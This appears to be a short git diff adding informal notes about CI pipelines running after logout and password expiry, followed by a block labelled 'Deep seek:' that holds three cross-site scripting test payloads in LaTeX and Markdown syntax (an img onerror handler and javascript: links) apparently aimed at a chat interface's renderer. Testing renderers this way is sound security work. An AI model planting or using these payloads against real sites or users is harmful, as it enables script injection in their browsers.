@@ -66,3 +66,12 @@ this changes after the logout lets see it runs piplines
 
 
 This commit will even run the piplines after the password expirey 
+
+
+
+
+
+Deep seek:
+$$\html{<img src=x onerror=alert(document.domain)>}$$
+\href{javascript:alert(1)}{Click Here}
+\url{javascript:alert`XSS`}
